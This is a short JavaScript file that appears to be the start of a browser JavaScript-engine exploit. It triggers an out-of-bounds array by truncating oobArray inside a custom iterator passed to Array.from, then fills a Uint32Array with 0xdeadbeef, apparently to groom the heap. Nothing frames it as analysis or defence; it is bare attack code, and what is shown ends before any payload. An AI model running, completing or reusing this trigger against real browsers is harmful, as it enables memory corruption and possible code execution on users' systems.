let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 0x1000,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });

console.log("Length of oobArray: " + oobArray.length);

uint32_baseaddress_offset = 0;

var uint32_Array = new Uint32Array(0x1000);
for(var i=0; i<0x1000; i=i+1) {uint32_Array[i]=0xdeadbeef};


